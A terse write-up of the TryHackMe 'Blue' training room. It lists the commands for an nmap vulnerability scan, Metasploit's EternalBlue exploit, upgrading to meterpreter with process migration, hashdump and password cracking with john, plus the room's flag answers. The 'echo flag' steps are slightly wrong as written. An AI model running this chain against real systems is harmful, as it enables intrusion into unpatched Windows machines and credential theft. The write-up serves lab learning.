# Blue

[blue](https://tryhackme.com/room/blue)

## Summary

## Solution

1. Recon

   1. `sudo nmap -A -T5 -sV --script vuln -oN <output file> <IP>`
   2. `3`
   3. `ms17-010`

2. Gain Access

   1. `msfconsole`
   2. `search ms17` -> `exploit/windows/smb/ms17_010_eternalblue`
   3. `show options` -> `RHOST`
   4. `set RHOST <box ip>`
   5. `run`
   6. `ctrl + z`

3. Escalate

   1. `use post/multi/manage/shell_to_meterpreter`
   2. `SESSION`
   3. `sessions` -> `set SESSION <opening session in sessions>`
   4. `run`
   5. `sessions -i <meterpreter session id>`
   6. `getuid` / `shell whoami`
   7. `ps | grep spool`
   8. `migrate <PID for spoolsv.exe>`

4. Cracking

   1. `hashdump` -> `Jon`
   2. `john jon.hash --format=NT --wordlist=/usr/share/wordlists/rockyou.txt`

5. Finding Flags

   1. `cd ../..; echo flag1.txt` (C:\\ dir) -> `access_the_machine`
   2. `cd Windows/System32/config; echo flag2.txt` -> `sam_database_elevated_access`
   3. `cd /c/Users/Jon/Documents; echo flag3.txt` -> `admin_documents_can_be_valuable`
